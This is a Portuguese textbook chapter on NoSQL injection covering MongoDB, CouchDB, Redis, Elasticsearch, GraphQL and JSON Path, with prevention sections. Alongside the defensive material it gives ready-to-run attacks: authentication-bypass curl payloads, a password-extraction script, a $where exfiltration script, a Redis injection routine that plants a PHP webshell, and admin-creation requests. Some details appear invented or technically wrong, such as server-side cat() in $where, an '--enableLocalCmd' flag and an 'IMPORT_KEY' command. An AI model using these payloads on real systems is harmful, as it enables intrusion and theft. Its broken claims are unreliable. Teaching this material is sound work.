# Capítulo 7: NoSQL Injection

## Introdução

A NoSQL Injection é uma classe de vulnerabilidade que explora diferenças fundamentais entre bancos de dados NoSQL e os tradicionais sistemas relacionais. Enquanto a SQL Injection clássica manipula consultas SQL para extrair ou alterar dados, a NoSQL Injection explora o formato de entrada — tipicamente JSON, BSON ou parâmetros de URL — para injetar operadores, operadores lógicos ou comandos maliciosos. Cada motor NoSQL possui seu próprio modelo de consulta e, consequentemente, seu próprio conjunto de vetores de ataque. Este capítulo cobre os principais vetores para MongoDB, CouchDB, Redis, Elasticsearch, GraphQL e JSON path injection, além de comparar e demonstrar prevenção eficaz.

---

## NoSQL vs SQL Security

### Diferenças Fundamentais de Segurança

A segurança em bancos de dados relacionais se concentra em proteger a integridade de consultas SQL, usando parameterização, stored procedures e modelagem de permissões baseada em papéis. A abordagem NoSQL introduz novos vetores porque:

- **Formatos de entrada variados**: JSON, BSON, query strings HTTP, parâmetros de formulário
- **Operadores dinâmicos**: operadores de consulta ($gt, $ne, $regex) podem ser injetados diretamente
- **Ausência de schema rígido**: bancos schemaless permitem campos arbitrários
- **Protocolos HTTP**: muitos bancos NoSQL expõem APIs REST, aumentando a superfície de ataque
- **Autenticação fraca por padrão**: Several NoSQL databases have permissive default configurations

### Modelo de Ameaças Comparativo

Em SQL, o atacante manipula strings de consulta. Em NoSQL, o atacante pode:

1. Injetar operadores de consulta em campos que esperam valores primitivos
2. Manipular estruturas JSON para alterar a lógica de consulta
3. Explorar eval() ou equivalentes para execução remota de código
4. Abusar de funcionalidades de replica para persistir dados maliciosos
5. Manipular índices para negação de serviço

### Tabelas de Comparação de Segurança

| Aspecto | SQL | NoSQL |
|---------|-----|-------|
| Formato de consulta | String SQL | JSON/BSON/Objetos |
| Tipo Checking | Forte (tipado) | Fraco (dinâmico) |
| Vetor de injeção | String de consulta | Campos JSON, parâmetros HTTP |
| Exploitation | UNION SELECT, comentarios | Operadores $gt, $ne, $regex |
| Execução remota | xp_cmdshell (muitas vezes desabilitado) | $where com JavaScript |
| Autenticação | Tipicamente robusta | Variável, frequentemente permissiva |
| Auditoria | Logs de consultas | Logs frequentemente desabilitados |

---

## MongoDB Injection

### Fundamentos do MongoDB

MongoDB armazena documentos em formato BSON e permite consultas usando operadores especiais prefixados com `$`. Quando a aplicação não valida adequadamente os dados de entrada, o atacante pode substituir valores primitivos por objetos contendo operadores.

### Vetor de Ataque: $gt

O operador `$gt` (greater than) é um dos vetores mais comuns. Quando a aplicação espera um valor de string e aceita um objeto, o atacante pode enviar `$gt: ""` para corresponder a qualquer valor não vazio.

**Exemplo de vulnerabilidade em Node.js com Express:**

```javascript
const express = require('express');
const { MongoClient } = require('mongodb');
const app = express();

app.use(express.json());

// ROTA VULNERAVEL
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // O campo password é diretamente inserido na consulta
    // Se o atacante enviar {"password": {"$gt": ""}}, a consulta sempre retorna verdadeiro
    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });
    
    if (user) {
        res.json({ success: true, token: generateToken(user) });
    } else {
        res.status(401).json({ success: false });
    }
});
```

**Exploitation:**

```bash
# Requisição legítima
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "minhasenha123"}'

# Requisição maliciosa - bypass de autenticação
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'

# Requisição maliciosa - bypass com $ne
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

### Vetor de Ataque: $ne

O operador `$ne` (not equal) corresponde a qualquer valor que não seja igual ao especificado. Similar ao `$gt`, pode ser usado para bypass de autenticação.

**Exemplo de vulnerabilidade em Python com Flask:**

```python
from flask import Flask, request, jsonify
from pymongo import MongoClient

app = Flask(__name__)
client = MongoClient('mongodb://localhost:27017/')
db = client['vulnerable_app']

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # VULNERAVEL: dados de entrada diretamente na consulta
    user = db.users.find_one({
        'username': username,
        'password': password
    })
    
    if user:
        return jsonify({'success': True, 'token': 'fake_token'})
    return jsonify({'success': False}), 401
```

```bash
# Exploitation com $ne
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrongpassword"}}'
```

### Vetor de Ataque: $regex

O operador `$regex` permite consultas baseadas em expressões regulares. Pode ser usado para extrair dados gradualmente por brute force de caracteres.

**Exemplo de exploitation:**

```javascript
// Extrair caracteres um por um usando regex
// Primeiro, determinar o comprimento da senha
db.users.findOne({
    username: "admin",
    password: { $regex: "^.{0,}$" }
});

// Encontrar a primeira letra
db.users.findOne({
    username: "admin",
    password: { $regex: "^a" }
});

// Encontrar os dois primeiros caracteres
db.users.findOne({
    username: "admin",
    password: { $regex: "^ab" }
});

// Continuar até descobrir a senha completa
db.users.findOne({
    username: "admin",
    password: { $regex: "^abc123!@" }
});
```

**Script automatizado de extração:**

```python
import requests
import string

def extract_password(url, username):
    password = ""
    charset = string.ascii_letters + string.digits + string.punctuation
    
    while True:
        found = False
        for char in charset:
            payload = {
                "username": username,
                "password": {"$regex": f"^{password}{char}"}
            }
            
            response = requests.post(url, json=payload)
            data = response.json()
            
            if data.get("success"):
                password += char
                print(f"Found so far: {password}")
                found = True
                break
        
        if not found:
            break
    
    return password

# Uso
extract_password("http://target.com/login", "admin")
```

### Vetor de Ataque: $where com JavaScript

O operador `$where` permite executar JavaScript arbitrário no servidor MongoDB. Este é o vetor mais perigoso, pois permite execução remota de código (RCE).

**Exemplo de vulnerabilidade:**

```javascript
// VULNERAVEL: uso direto de $where com dados do usuario
app.post('/search', async (req, res) => {
    const { query } = req.body;
    
    const results = await db.collection('products').find({
        $where: `this.name.indexOf('${query}') !== -1`
    }).toArray();
    
    res.json(results);
});
```

**Exploitation com RCE:**

```javascript
// Injeção via $where para execução de código
// 1. Verificar se o campo existe
db.products.find({
    $where: "this.name.indexOf('') !== -1 || (function() { return true; })()"
});

// 2. Extrair dados de outros collections
db.products.find({
    $where: "(function() { var cmd = new cat('/etc/passwd'); return cmd.toString().length > 0; })()"
});

// 3. Executar comandos do sistema (MongoDB com --enableLocalCmd)
db.products.find({
    $where: "(function() { var cmd = cat('/etc/passwd'); return cmd.length > 0; })()"
});
```

**Script de exploitation com exfiltração:**

```python
import requests
import re

def exploit_rce(url, command):
    """Exfiltra dados via side channel usando $where"""
    
    # Verificar se o comando retorna dados
    payload = {
        "query": f"'' || (function() {{ var r = cat('{command}'); return r.length > 0; }})()"
    }
    
    response = requests.post(
        f"{url}/search",
        json={"query": payload["query"]}
    )
    
    return response.status_code == 200

def exfiltrate_via_regex(url, command):
    """Exfiltrar dados caractere por caractere"""
    result = ""
    printable_chars = range(32, 127)  # ASCII printable
    
    while True:
        found = False
        for char_code in printable_chars:
            char = chr(char_code)
            # Usar side channel para determinar se o caractere existe
            payload = {
                "query": f"'' || (function() {{ var r = cat('{command}'); return r.charAt({len(result)}) === '{char}'; }})()"
            }
            
            response = requests.post(f"{url}/search", json={"query": payload["query"]})
            
            if response.status_code == 200:
                result += char
                print(f"Found: {result}")
                found = True
                break
        
        if not found:
            break
    
    return result
```

### Prevenção no MongoDB

**1. Usar filter ou query builder ao invés de interpolação:**

```python
# CORRETO: usando filter seguro
from pymongo import MongoClient
from bson.json_util import loads

client = MongoClient('mongodb://localhost:27017/')
db = client['secure_app']

def safe_find_user(username, password):
    """Busca usuario usando filtros seguros"""
    # Validar que os valores são strings primitivas
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input type")
    
    # Usar filtros seguros - operadores não são aceitos em valores
    query = {
        "username": username,
        "password": password
    }
    
    return db.users.find_one(query)
```

**2. Schema validation no MongoDB (4.0+):**

```javascript
// Criar schema de validação para a collection users
db.createCollection("users", {
    validator: {
        $jsonSchema: {
            bsonType: "object",
            required: ["username", "password"],
            properties: {
                username: {
                    bsonType: "string",
                    description: "Must be a string and is required"
                },
                password: {
                    bsonType: "string",
                    minLength: 8,
                    description: "Must be a string of at least 8 characters"
                }
            }
        }
    }
});
```

**3. Desabilitar $where em produção:**

```bash
# Iniciar MongoDB sem suporte a JavaScript
mongod --setParameter javascriptEnabled=false
```

**4. Usar Mongoose com validação:**

```javascript
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        trim: true,
        minlength: 3,
        maxlength: 50,
        match: /^[a-zA-Z0-9_]+$/
    },
    password: {
        type: String,
        required: true,
        minlength: 8
    }
});

// Mongoose valida automaticamente os tipos antes de enviar ao MongoDB
const User = mongoose.model('User', userSchema);

async function findUserSafe(username, password) {
    // Mongoose rejeita objetos como valores - só aceita primitivos
    return User.findOne({ username, password });
}
```

---

## CouchDB Injection

### Fundamentos do CouchDB

Apache CouchDB é um banco de dados NoSQL baseado em HTTP/REST que armazena documentos JSON. As consultas são feitas via HTTP GET/POST, o que aumenta a superfície de ataque.

### Vetor de Ataque: Consultas de Listagem

CouchDB permite listagem de documentos via HTTP. Se a aplicação não valida os parâmetros, é possível enumerar dados sensíveis.

**Exemplo de vulnerabilidade:**

```python
from flask import Flask, request, jsonify
import requests as couch_requests

app = Flask(__name__)
COUCHDB_URL = "http://localhost:5984"

@app.route('/user', methods=['GET'])
def get_user():
    user_id = request.args.get('id')
    
    # VULNERAVEL: interpolacao direta na URL
    response = couch_requests.get(
        f"{COUCHDB_URL}/users/{user_id}"
    )
    
    return jsonify(response.json())
```

**Exploitation:**

```bash
# Enumerar todos os documentos
curl "http://target.com/user?id=_all_docs&include_docs=true"

# Acessar configuração do servidor
curl "http://target.com/user?id=_config"

# Explorar access para obter hashes de senha
curl "http://target.com/user?id=_users"

# Acessar logs do sistema
curl "http://target.com/user?id=_log"

# Explorar replicação
curl "http://target.com/user?id=_replicate"
```

### Vetor de Ataque: Futon Interface

CouchDB inclui uma interface web chamada Futon que, se acessível, pode ser explorada para:

1. Criar usuários administradores
2. Modificar configurações
3. Acessar todos os bancos de dados
4. Explorar funções de administração

**Exploitation via API:**

```bash
# Criar usuário admin via API (se autenticação desabilitada)
curl -X PUT http://target:5984/_users/org.couchdb.user:admin \
  -H "Content-Type: application/json" \
  -d '{
    "name": "admin",
    "password": "password123",
    "roles": ["_admin"],
    "type": "user"
  }'

# Acessar banco de dados de usuários
curl http://target:5984/_users/_all_docs?include_docs=true

# Explorar função de design
curl http://target:5984/mydb/_design/mydesign
```

### Vetor de Ataque: Show Functions

CouchDB permite funções JavaScript customizadas em documentos de design. Se o atacante pode modificar documentos de design, pode executar código arbitrário.

```javascript
// Função maliciosa em um documento de design
{
    "_id": "_design/malicious",
    "show": {
        "rce": "function(doc, req) { return { body: cat('/etc/passwd') }; }"
    }
}
```

**Exploitation:**

```bash
# Explorar show function maliciosa
curl "http://target:5984/mydb/_design/malicious/_show/rce"
```

### Prevenção no CouchDB

```python
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

def sanitize_couchdb_id(doc_id):
    """Remove caracteres perigosos do ID"""
    # Permitir apenas alfanuméricos, hifens e underscores
    if not re.match(r'^[a-zA-Z0-9_-]+$', doc_id):
        raise ValueError("Invalid document ID")
    return doc_id

@app.route('/user', methods=['GET'])
def get_user():
    user_id = request.args.get('id')
    
    # Validação antes de usar na consulta
    try:
        user_id = sanitize_couchdb_id(user_id)
    except ValueError:
        return jsonify({"error": "Invalid ID"}), 400
    
    # Usar a API segura do CouchDB
    db = couchdb.Database('http://localhost:5984/users')
    try:
        doc = db[user_id]
        return jsonify(doc)
    except couchdb.httpdb.ResourceNotFound:
        return jsonify({"error": "Not found"}), 404
```

**Configuração segura:**

```ini
# Em local.ini - habilitar autenticação
[admins]
admin = password_segura_aqui

[chttpd]
require_valid_user = true
authentication_redirect = /_utils/session.html

[httpd]
WWW-Authenticate = Basic realm="CouchDB"
```

---

## Redis Injection

### Fundamentos do Redis

Redis é um banco de dados chave-valor que aceita comandos via protocolo RESP (Redis Serialization Protocol). A injeção em Redis ocorre quando a aplicação concatena dados de entrada diretamente em comandos Redis.

### Vetor de Ataque: Command Injection via Newline

Redis processa comandos separados por CRLF (\r\n). Se a entrada não é sanitizada, o atacante pode injetar múltiplos comandos.

**Exemplo de vulnerabilidade em Python:**

```python
import redis

def get_user_profile(user_id):
    """VULNERAVEL: interpolacao direta de user_id"""
    r = redis.Redis(host='localhost', port=6379)
    
    # user_id é diretamente interpolado na string de comando
    key = f"user:{user_id}:profile"
    result = r.execute_command(f"GET {key}")
    
    return result

# O atacante pode enviar user_id como:
# "foo\r\nFLUSHALL\r\nINFO"
# Isso executa GET user:foo:profile, depois FLUSHALL e INFO
```

**Exploitation detalhada:**

```python
import redis
import time

def exploit_redis_command_injection(target_func):
    """Demonstra command injection em Redis"""
    
    # 1. Flush de todos os dados
    payload = "foo\r\nFLUSHALL"
    try:
        target_func(payload)
    except Exception:
        pass
    
    # 2. Criar chave com payload malicioso
    payload = 'foo\r\nSET evil_key "<!DOCTYPE html><script>alert(1)</script>"'
    try:
        target_func(payload)
    except Exception:
        pass
    
    # 3. Configurar para persistir chaves
    payload = "foo\r\nCONFIG SET dir /var/www/html"
    try:
        target_func(payload)
    except Exception:
        pass
    
    payload = "foo\r\nCONFIG SET dbfilename shell.php"
    try:
        target_func(payload)
    except Exception:
        pass
    
    # 4. Escrever webshell
    shell_payload = 'foo\r\nSET payload "<?php system($_GET[\'cmd\']); ?>"'
    try:
        target_func(shell_payload)
    except Exception:
        pass
    
    # 5. Salvar no disco
    payload = "foo\r\nSAVE"
    try:
        target_func(payload)
    except Exception:
        pass

# 6. Executar o exploit
def vulnerable_get(user_id):
    r = redis.Redis(host='localhost', port=6379, decode_responses=True)
    return r.execute_command(f"GET user:{user_id}")

# exploit_redis_command_injection(vulnerable_get)
```

### Vetor de Ataque: Lua Script Injection

Redis 2.6+ suporta scripts Lua. Se a aplicação usa `EVAL` com dados não sanitizados, o atacante pode executar código Lua arbitrário.

**Exemplo de vulnerabilidade:**

```python
def search_items_redis(query):
    """VULNERAVEL: query diretamente no script Lua"""
    r = redis.Redis(host='localhost', port=6379)
    
    # Lua script com interpolação direta
    lua_script = f"""
    local results = redis.call('KEYS', '*{query}*')
    local output = {{}}
    for i, key in ipairs(results) do
        table.insert(output, redis.call('GET', key))
    end
    return output
    """
    
    return r.eval(lua_script, 0)
```

**Exploitation via Lua:**

```python
def exploit_lua_injection(query):
    """Explora Lua script injection"""
    r = redis.Redis(host='localhost', port=6379)
    
    # Injeção no script Lua
    malicious_query = "*\"); os.execute('whoami'); redis.call('KEYS', '*"
    
    lua_script = f"""
    local results = redis.call('KEYS', '{malicious_query}')
    return results
    """
    
    try:
        result = r.eval(lua_script, 0)
        return result
    except redis.exceptions.ResponseError as e:
        # A saída do comando pode conter informações
        return str(e)
```

### Vetor de Ataque: SSRF via Redis

Se a aplicação permite que dados de entrada cheguem ao Redis sem sanitização, o atacante pode usar Redis para fazer Server-Side Request Forgery (SSRF).

**Exemplo:**

```python
def import_data_redis(url):
    """VULNERAVEL: URL diretamente no comando Redis"""
    r = redis.Redis(host='localhost', port=6379)
    
    # Se url for "http://evil.com/shell.php" e a aplicação baixar
    # o conteúdo e salvar no Redis, o atacante pode fazer SSRF
    r.execute_command(f"IMPORT_KEY mykey {url}")
```

### Prevenção no Redis

**1. Usar pipelines e parâmetros:**

```python
import redis

class SecureRedisClient:
    def __init__(self):
        self.r = redis.Redis(
            host='localhost',
            port=6379,
            decode_responses=True,
            socket_connect_timeout=5,
            socket_timeout=5
        )
    
    def get_user_profile(self, user_id):
        """Busca perfil usando parâmetros seguros"""
        # Validação de entrada
        if not isinstance(user_id, str):
            raise ValueError("user_id must be a string")
        
        if not user_id.isalnum():
            raise ValueError("user_id contains invalid characters")
        
        # Usar pipeline para operações seguras
        pipe = self.r.pipeline()
        key = f"user:{user_id}:profile"
        pipe.get(key)
        results = pipe.execute()
        
        return results[0] if results else None
    
    def safe_search(self, query):
        """Busca segura usando SCAN ao invés de KEYS"""
        if not isinstance(query, str):
            raise ValueError("query must be a string")
        
        # Usar SCAN para busca segura
        cursor = 0
        results = []
        
        while True:
            cursor, keys = self.r.scan(
                cursor=cursor,
                match=f"*{self._escape_pattern(query)}*",
                count=100
            )
            
            for key in keys:
                value = self.r.get(key)
                if value:
                    results.append({"key": key, "value": value})
            
            if cursor == 0:
                break
        
        return results
    
    def _escape_pattern(self, pattern):
        """Escapa caracteres especiais do Redis"""
        special_chars = ['*', '?', '[', ']', '\\']
        for char in special_chars:
            pattern = pattern.replace(char, f'\\{char}')
        return pattern
    
    def execute_lua_script(self, script, keys, args):
        """Executa script Lua com parâmetros seguros"""
        # Usar script carregado ao invés de interpolação
        safe_script = self.r.register_script(script)
        return safe_script(keys=keys, args=args)
```

**2. Configuração segura do Redis:**

```bash
# redis.conf - Configurações de segurança

# Desabilitar comandos perigosos
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command DEBUG ""
rename-command KEYS ""
rename-command SAVE ""
rename-command SHUTDOWN ""
rename-command DEL ""

# Habilitar autenticação
requirepass your_strong_password_here

# Limitar conexões
maxclients 10000

# Desabilitar bind externo
bind 127.0.0.1

# Configurar timeout
timeout 300

# Desabilitar Lua script perigoso
lua-time-limit 5000
```

---

## Elasticsearch Injection

### Fundamentos do Elasticsearch

Elasticsearch é um motor de busca distribuído que aceita consultas em formato JSON. A injeção ocorre quando a aplicação concatena dados de entrada em consultas Elasticsearch.

### Vetor de Ataque: Query String Injection

**Exemplo de vulnerabilidade:**

```python
from flask import Flask, request, jsonify
from elasticsearch import Elasticsearch

app = Flask(__name__)
es = Elasticsearch(['http://localhost:9200'])

@app.route('/search', methods=['GET'])
def search():
    query = request.args.get('q')
    
    # VULNERAVEL: query diretamente na string
    results = es.search(
        index="products",
        body={
            "query": {
                "query_string": {
                    "query": query  # Entrada do usuario diretamente aqui
                }
            }
        }
    )
    
    return jsonify(results['hits']['hits'])
```

**Exploitation:**

```bash
# Extrair todos os dados
curl "http://target.com/search?q=*:*"

# Extrair campos específicos
curl "http://target.com/search?q=*:*&fields=password,secret_key"

# Usar regex para extração
curl "http://target.com/search?q=password:/[a-zA-Z0-9]+/"

# Explorar campos internos do Elasticsearch
curl "http://target.com/search?q=_type:_settings"

# Acessar informações do cluster
curl "http://target.com/search?q=_cluster:health"
```

### Vetor de Ataque: Script Injection

Se o Elasticsearch permite scripts dinâmicos, o atacante pode executar código arbitrário.

**Exemplo de vulnerabilidade com scripts:**

```python
def search_with_script(user_query):
    """VULNERAVEL: script interpolado com dados do usuario"""
    es = Elasticsearch(['http://localhost:9200'])
    
    # Script com interpolação direta
    script = f"""
    return doc['{user_query}'].value;
    """
    
    results = es.search(
        index="products",
        body={
            "query": {
                "script": {
                    "script": script
                }
            }
        }
    )
    
    return results
```

**Exploitation:**

```bash
# Executar comandos do sistema via script injection
curl -X POST "http://target:9200/products/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "script": {
        "script": "Runtime.getRuntime().exec(\"whoami\")"
      }
    }
  }'
```

### Prevenção no Elasticsearch

```python
from elasticsearch import Elasticsearch
from elasticsearch_dsl import Search, Q

class SecureElasticsearchClient:
    def __init__(self):
        self.es = Elasticsearch(['http://localhost:9200'])
    
    def safe_search(self, index, user_query):
        """Busca segura usando Elasticsearch DSL"""
        # Usar query builder ao invés de interpolação
        s = Search(using=self.es, index=index)
        
        # Usar match ao invés de query_string
        q = Q("match", content=user_query)
        s = s.query(q)
        
        # Limitar campos retornados
        s = s.source(["title", "content", "category"])
        
        # Limitar número de resultados
        s = s[:10]
        
        return s.execute()
    
    def safe_multi_search(self, index, queries):
        """Busca múltipla segura"""
        search_body = []
        
        for query in queries:
            search_body.append({"index": index})
            search_body.append({
                "query": {
                    "bool": {
                        "must": [
                            {"match": {"content": query}}
                        ],
                        "filter": [
                            {"term": {"status": "published"}}
                        ]
                    }
                },
                "source": ["title", "content"],
                "size": 10
            })
        
        return self.es.msearch(body=search_body)
```

---

## GraphQL Injection

### Fundamentos do GraphQL

GraphQL é uma linguagem de consulta para APIs que permite ao cliente especificar exatamente os dados que precisa. A injeção em GraphQL ocorre quando a aplicação não valida adequadamente as consultas.

### Vetor de Ataque: Query Introspection

GraphQL permite introspecção completa do schema, o que pode revelar campos sensíveis.

**Exemplo de vulnerabilidade:**

```graphql
# Introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
          }
        }
      }
    }
  }
}
```

**Exploitation:**

```bash
# Descobrir schema completo
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name } } } } }"
  }'

# Descobrir mutações
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"
  }'
```

### Vetor de Ataque: Batch Query Attack

GraphQL permite múltiplas operações em uma única requisição, o que pode ser explorado para bypass de rate limiting.

**Exemplo de vulnerabilidade:**

```python
from flask import Flask, request, jsonify
from graphql import graphql_sync, build_ast_schema

app = Flask(__name__)

@app.route('/graphql', methods=['POST'])
def graphql_endpoint():
    data = request.get_json()
    query = data.get('query')
    
    # VULNERAVEL: execução direta sem validação
    result = graphql_sync(schema, query)
    
    return jsonify(result.data)
```

**Exploitation com batch:**

```graphql
# Batch query para bypass de rate limiting
query {
  user1: user(id: "1") { email password }
  user2: user(id: "2") { email password }
  user3: user(id: "3") { email password }
  # ... centenas de queries
}
```

### Vetor de Ataque: Fragment Abuse

GraphQL permite fragments que podem ser explorados para extrair dados não autorizados.

**Exemplo:**

```graphql
# Fragment malicioso
fragment FullUser on User {
  id
  email
  password
  ssn
  creditCard
}

query {
  users {
    ...FullUser
  }
}
```

### Prevenção no GraphQL

```python
from graphql import GraphQLSchema, GraphQLObjectType, GraphQLField, GraphQLString
from graphql import graphql_sync, validation
import re

class SecureGraphQLHandler:
    def __init__(self):
        self.schema = self._build_schema()
        self.max_query_depth = 5
        self.max_query_complexity = 100
    
    def _build_schema(self):
        """Constrói schema com campos seguros"""
        user_type = GraphQLObjectType(
            'User',
            lambda: {
                'id': GraphQLField(GraphQLString),
                'name': GraphQLField(GraphQLString),
                'email': GraphQLField(GraphQLString),
                # Campos sensíveis NÃO incluídos no schema
            }
        )
        
        return GraphQLSchema(
            query=GraphQLObjectType(
                'Query',
                lambda: {
                    'user': GraphQLField(
                        user_type,
                        args={'id': GraphQLField(GraphQLString)}
                    )
                }
            )
        )
    
    def validate_query(self, query):
        """Valida a query antes de executar"""
        # Desabilitar introspection em produção
        if '__schema' in query or '__type' in query:
            raise ValueError("Introspection not allowed")
        
        # Verificar profundidade da query
        depth = self._calculate_depth(query)
        if depth > self.max_query_depth:
            raise ValueError(f"Query too deep: {depth}")
        
        # Verificar complexidade
        complexity = self._calculate_complexity(query)
        if complexity > self.max_query_complexity:
            raise ValueError(f"Query too complex: {complexity}")
        
        # Validar contra o schema
        from graphql.language import parse
        document = parse(query)
        errors = validation.validate(self.schema, document)
        
        if errors:
            raise ValueError(f"Invalid query: {errors}")
        
        return True
    
    def _calculate_depth(self, query):
        """Calcula profundidade da query"""
        depth = 0
        max_depth = 0
        
        for char in query:
            if char == '{':
                depth += 1
                max_depth = max(max_depth, depth)
            elif char == '}':
                depth -= 1
        
        return max_depth
    
    def _calculate_complexity(self, query):
        """Calcula complexidade da query"""
        # Contar campos
        field_count = len(re.findall(r'\b\w+\b(?=\s*[({:])', query))
        return field_count
```

---

## JSON Path Injection

### Fundamentos

JSON Path é uma linguagem de consulta para estruturas JSON, similar ao XPath para XML. A injeção ocorre quando a aplicação usa JSON Path para consultar dados sem validar os caminhos.

### Vetor de Ataque: Path Traversal

**Exemplo de vulnerabilidade:**

```python
import json
from flask import Flask, request, jsonify
import jsonpath_ng

app = Flask(__name__)

@app.route('/extract', methods=['POST'])
def extract_data():
    data = request.get_json()
    json_path = data.get('path')
    json_data = data.get('data')
    
    # VULNERAVEL: json_path diretamente interpolado
    expression = jsonpath_ng.parse(json_path)
    results = [match.value for match in expression.find(json_data)]
    
    return jsonify({"results": results})
```

**Exploitation:**

```bash
# Extrair todos os dados
curl -X POST http://target.com/extract \
  -H "Content-Type: application/json" \
  -d '{
    "path": "$[*]",
    "data": {"sensitive": "data"}
  }'

# Acessar campos pai
curl -X POST http://target.com/extract \
  -H "Content-Type: application/json" \
  -d '{
    "path": "$.parent.child.grandchild",
    "data": {"parent": {"child": {"grandchild": "secret"}}}
  }'

# Usar filtros para extração seletiva
curl -X POST http://target.com/extract \
  -H "Content-Type: application/json" \
  -d '{
    "path": "$[?(@.password)]",
    "data": [{"name": "user1"}, {"name": "user2", "password": "secret"}]
  }'
```

### Prevenção

```python
import json
import jsonpath_ng
from jsonpath_ng.exceptions import JsonPathParserError

def safe_json_path_extract(data, path):
    """Extrai dados usando JSON Path seguro"""
    # Whitelist de caminhos permitidos
    allowed_paths = [
        "$.user.name",
        "$.user.email",
        "$.product.title",
        "$.product.price"
    ]
    
    # Validar contra whitelist
    if path not in allowed_paths:
        raise ValueError(f"Path not allowed: {path}")
    
    try:
        expression = jsonpath_ng.parse(path)
        results = [match.value for match in expression.find(data)]
        return results
    except JsonPathParserError as e:
        raise ValueError(f"Invalid JSON path: {e}")
```

---

## Operator Injection

### Fundamentos

Operator injection ocorre quando a aplicação permite que o usuário especifique operadores de consulta, tipicamente em APIs que aceitam objetos JSON.

### Vetor de Ataque: $where Injection

**Exemplo de vulnerabilidade em Node.js:**

```javascript
const express = require('express');
const mongoose = require('mongoose');
const app = express();

app.post('/filter', async (req, res) => {
    const { filter } = req.body;
    
    // VULNERAVEL: filter diretamente na consulta
    const results = await Product.find(filter);
    
    res.json(results);
});
```

**Exploitation:**

```bash
# Bypass de filtros
curl -X POST http://target.com/filter \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {
      "price": {"$gt": 0},
      "$where": "this.price > 0 && this.secret === \"reveal\""
    }
  }'

# Acessar campos não autorizados
curl -X POST http://target.com/filter \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {
      "category": "electronics",
      "password": {"$ne": null}
    }
  }'
```

### Prevenção

```javascript
const express = require('express');
const mongoose = require('mongoose');
const app = express();

// Schema de validação de filtros
const allowedOperators = ['$eq', '$ne', '$gt', '$gte', '$lt', '$lte', '$in', '$nin'];
const forbiddenOperators = ['$where', '$regex', '$expr', '$function'];

function sanitizeFilter(filter, allowedFields) {
    // Remover operadores proibidos
    function removeForbidden(obj) {
        for (const key in obj) {
            if (forbiddenOperators.includes(key)) {
                delete obj[key];
            } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                removeForbidden(obj[key]);
            }
        }
    }
    
    removeForbidden(filter);
    
    // Validar que apenas campos permitidos estão presentes
    function validateFields(obj, path = '') {
        for (const key in obj) {
            const fullPath = path ? `${path}.${key}` : key;
            
            if (!allowedFields.includes(fullPath) && !allowedOperators.includes(key)) {
                delete obj[key];
            } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                validateFields(obj[key], fullPath);
            }
        }
    }
    
    validateFields(filter);
    return filter;
}

app.post('/filter', async (req, res) => {
    const { filter } = req.body;
    
    // Campos permitidos para consulta
    const allowedFields = ['category', 'price', 'name', 'stock'];
    
    // Sanitizar o filtro
    const safeFilter = sanitizeFilter(filter, allowedFields);
    
    const results = await Product.find(safeFilter);
    res.json(results);
});
```

---

## Prevenção em Cada NoSQL

### MongoDB - Checklist de Segurança

```python
# 1. Schema Validation
db.createCollection("users", {
    validator: {
        $jsonSchema: {
            bsonType: "object",
            required: ["username", "password"],
            properties: {
                username: {
                    bsonType: "string",
                    pattern: "^[a-zA-Z0-9_]{3,50}$"
                },
                password: {
                    bsonType: "string",
                    minLength: 8
                }
            }
        }
    }
})

# 2. Desabilitar JavaScript
# mongod --setParameter javascriptEnabled=false

# 3. Usar autenticação
# mongod --auth

# 4. Criar usuários com privilégios mínimos
db.createUser({
    user: "app_user",
    pwd: "strong_password",
    roles: [
        { role: "readWrite", db: "myapp" }
    ]
})

# 5. Habilitar audit log
db.setAuditFilter({
    atype: "authenticate"
})
```

### CouchDB - Checklist de Segurança

```ini
# 1. local.ini - Habilitar autenticação
[admins]
admin = password_muito_forte

[chttpd]
require_valid_user = true
require_valid_user_except_for_up = true

# 2. Configurar CORS restritivo
[httpd]
enable_cors = false

# 3. Desabilitar acesso anônimo
[couchdb]
single_node = true
```

### Redis - Checklist de Segurança

```bash
# 1. redis.conf
requirepass password_forte
bind 127.0.0.1
protected-mode yes
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command KEYS ""

# 2. Configurar TLS
tls-port 6380
tls-cert-file /path/to/cert.pem
tls-key-file /path/to/key.pem
tls-ca-cert-file /path/to/ca.pem

# 3. Limitar memória
maxmemory 1gb
maxmemory-policy allkeys-lru
```

### Elasticsearch - Checklist de Segurança

```yaml
# elasticsearch.yml
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.http.ssl.enabled: true

# Desabilitar script injection
script.allowed_types: none
script.allowed_contexts: search

# Configurar autenticação
xpack.security.authc.realms.native.native1:
  order: 0
```

---

## Comparação de Vetores de Ataque

### Tabela Comparativa de Vetores

| Vetor | MongoDB | CouchDB | Redis | Elasticsearch |
|-------|---------|---------|-------|---------------|
| Operator Injection | $gt, $ne, $regex | View functions | N/A | Query string |
| Script Injection | $where (JS) | Show functions | EVAL (Lua) | Script field |
| Command Injection | N/A | N/A | RESP protocol | N/A |
